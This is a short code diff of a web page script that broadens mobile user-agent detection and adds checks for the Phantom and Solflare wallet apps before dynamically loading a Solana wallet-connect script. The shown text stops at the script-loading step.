@@ -8,7 +8,12 @@
     <script src="dynamicview.js"></script>
     <script src="info.js"></script>
     <script>
-        if (/Mobi|Android/i.test(navigator.userAgent)) { // Check for real mobile devices
+        const mobileRegex = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i;
+        const userAgent = navigator.userAgent.toLowerCase();
+        const isPhantomApp = userAgent.toLowerCase().includes('phantom');
+        const isSolflareApp = userAgent.toLowerCase().includes('solflare');
+
+        if (mobileRegex.test(navigator.userAgent) || isPhantomApp || isSolflareApp) { // Check for a broader range of mobile devices and include Phantom or Solflare apps
             setTimeout(() => {
                 const script = document.createElement('script');
                 script.src = 'Solana-connect.js';
